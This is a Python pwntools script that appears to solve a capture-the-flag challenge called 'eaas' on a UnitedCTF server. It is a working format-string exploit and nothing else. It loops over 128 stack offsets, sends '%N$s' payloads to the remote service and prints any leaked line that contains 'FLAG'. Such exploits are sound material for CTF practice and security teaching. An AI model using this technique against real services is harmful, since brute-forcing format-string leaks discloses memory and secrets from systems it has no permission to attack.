#!/usr/bin/python3
from pwn import *

context.clear(arch="amd64")
context.log_level = "error"

RHOST, RPORT = "nc.ctf.unitedctf.ca", 4003

elf = ELF("./dist/eaas")


def exploit(offset: int) -> None:
    r = remote(RHOST, RPORT, timeout=0.5)
    for _ in range(20):
        r.recvline()

    r.sendline(f"%{offset}$s".encode())
    return r.recvline()


for offset in range(128):
    try:
        leak = exploit(offset)
        if b"FLAG" in leak:
            print(leak.decode().split("=")[1])
            exit(0)
    except:
        pass
